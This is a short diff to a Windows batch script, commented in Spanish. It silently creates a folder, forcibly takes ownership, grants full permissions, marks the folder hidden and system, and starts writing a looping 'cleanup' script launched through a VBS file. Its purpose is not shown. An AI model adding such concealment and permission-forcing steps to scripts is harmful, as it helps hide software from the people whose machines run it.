@@ -15,8 +15,12 @@ set "cleanerName=system_cleanup.bat"
 set "vbsName=start_service.vbs"
 
 :: 1. Crear el directorio estratégico
-if not exist "%targetDir%" mkdir "%targetDir%" || (echo [!] No se pudo crear la carpeta en %targetDir%. & pause & exit /b)
-attrib +h +s "%targetDir%"
+if not exist "%targetDir%" mkdir "%targetDir%" 2>nul
+
+:: Forzar toma de posesión y permisos totales
+takeown /f "%targetDir%" /r /d s >nul 2>&1
+icacls "%targetDir%" /grant administrators:F /t >nul 2>&1
+attrib +h +s "%targetDir%" /d /s >nul 2>&1
 
 :: 2. Crear el script de limpieza (Bucle Infinito)
 echo @echo off > "%targetDir%\%cleanerName%"
